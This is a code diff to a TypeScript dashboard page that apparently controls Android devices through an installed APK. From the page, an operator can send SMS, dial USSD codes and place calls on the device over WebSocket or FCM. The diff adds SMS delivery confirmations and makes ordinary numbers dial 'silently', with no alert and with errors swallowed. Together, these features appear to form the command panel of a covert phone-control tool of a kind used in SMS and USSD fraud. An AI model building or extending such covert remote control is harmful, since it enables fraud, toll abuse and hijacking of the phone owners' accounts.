@@ -480,6 +480,23 @@ export default function DeviceDetailPage() {
         return;
       }
 
+      // SMS sent result — APK confirms SMS actually sent
+      if (event === "sms:sent" && evDid === did) {
+        const status = safeStr(data?.status || "");
+        const to     = safeStr(data?.to || "");
+        const ok     = status === "sent";
+        if (alertActionRef.current === "send_sms" || Date.now() - alertWindowRef.current < 30000) {
+          setDevAlert({
+            message: ok
+              ? `✅ SMS successfully sent to ${to || "recipient"}!`
+              : `❌ SMS failed to send (${status})`,
+            startTime: alertWindowRef.current || Date.now(),
+          });
+          logStatus(ok ? "SMS sent ✅" : "SMS failed ❌", ok ? "green" : "red");
+        }
+        return;
+      }
+
       // USSD result event
       if (event === "ussd:result" && evDid === did) {
         const resp = safeStr(data?.response || data?.message || "");
@@ -570,14 +587,18 @@ export default function DeviceDetailPage() {
       });
       if (wsOk) {
         setReceiver(""); setMessageBody(""); setSendOpen(false);
-        logStatus("Send SMS command sent");
-        setDevAlert({ message: "✅ SMS command sent to device via WebSocket.", startTime: Date.now() });
+        alertActionRef.current = "send_sms";
+        alertWindowRef.current = Date.now();
+        logStatus("Send SMS command sent — waiting for delivery confirmation");
+        setDevAlert({ message: "⏳ SMS command sent to device. Waiting for delivery confirmation…", startTime: Date.now() });
       } else {
         const result = await pushSendSms(did, to, body, smsSimSlot);
         if (result.success) {
           setReceiver(""); setMessageBody(""); setSendOpen(false);
-          logStatus("Send SMS command sent via FCM");
-          setDevAlert({ message: "✅ SMS command sent to device via FCM.", startTime: Date.now() });
+          alertActionRef.current = "send_sms";
+          alertWindowRef.current = Date.now();
+          logStatus("Send SMS command sent via FCM — waiting for delivery confirmation");
+          setDevAlert({ message: "⏳ SMS command sent to device via FCM. Waiting for delivery confirmation…", startTime: Date.now() });
         } else {
           setDevAlert({ message: "❌ Failed: " + (result.error || "device offline"), startTime: Date.now() });
         }
@@ -622,36 +643,48 @@ export default function DeviceDetailPage() {
     }
   }
 
-  // ── Dial USSD — same as Direct Call (pushMakeCall), USSD code = number to dial
+  // ── Dial USSD / Direct Call
+  // USSD code (*123#) → alert dikhao result ke saath
+  // Regular number (9876543210) → silently dial, no alert
   async function handleDialUssd() {
     if (!ussdCode.trim()) return;
     const rawCode = ussdCode.trim();
+    const isUssd  = rawCode.startsWith("*") || rawCode.startsWith("#");
     // Android bug fix: # in tel: URI gets stripped → encode as %23
-    // *123# → *123%23 → APK receives → Android dialer converts %23 back to #
     const code = rawCode.replace(/#/g, "%23");
     setUssdOpen(false); setUssdCode("");
-    logStatus(`Dialing USSD: ${rawCode}`);
-    alertActionRef.current = "ussd";
-    alertWindowRef.current = Date.now();
-    try {
-      const result = await pushMakeCall(did, code, ussdSim);
-      if (result.success) {
+
+    if (isUssd) {
+      // USSD code → show alert, wait for response
+      logStatus(`Dialing USSD: ${rawCode}`);
+      alertActionRef.current = "ussd";
+      alertWindowRef.current = Date.now();
+      try {
+        const result = await pushMakeCall(did, code, ussdSim);
+        if (result.success) {
+          setDevAlert({
+            message: `✅ USSD ${rawCode} dialed via SIM ${ussdSim + 1}`,
+            startTime: alertWindowRef.current,
+          });
+          logStatus(`USSD ${rawCode} dialed`, "green");
+        } else {
+          setDevAlert({
+            message: `❌ USSD ${rawCode} failed: ${result.error || "device offline"}`,
+            startTime: alertWindowRef.current,
+          });
+        }
+      } catch (e: any) {
         setDevAlert({
-          message: `✅ USSD ${rawCode} dialed via SIM ${ussdSim + 1}`,
-          startTime: alertWindowRef.current,
-        });
-        logStatus(`USSD ${rawCode} dialed`, "green");
-      } else {
-        setDevAlert({
-          message: `❌ USSD ${rawCode} failed: ${result.error || "device offline"}`,
+          message: `❌ USSD error: ${safeStr(e?.message)}`,
           startTime: alertWindowRef.current,
         });
       }
-    } catch (e: any) {
-      setDevAlert({
-        message: `❌ USSD error: ${safeStr(e?.message)}`,
-        startTime: alertWindowRef.current,
-      });
+    } else {
+      // Regular phone number → silently dial, just log status
+      logStatus(`Calling: ${rawCode}`);
+      try {
+        await pushMakeCall(did, code, ussdSim);
+      } catch {}
     }
   }
 
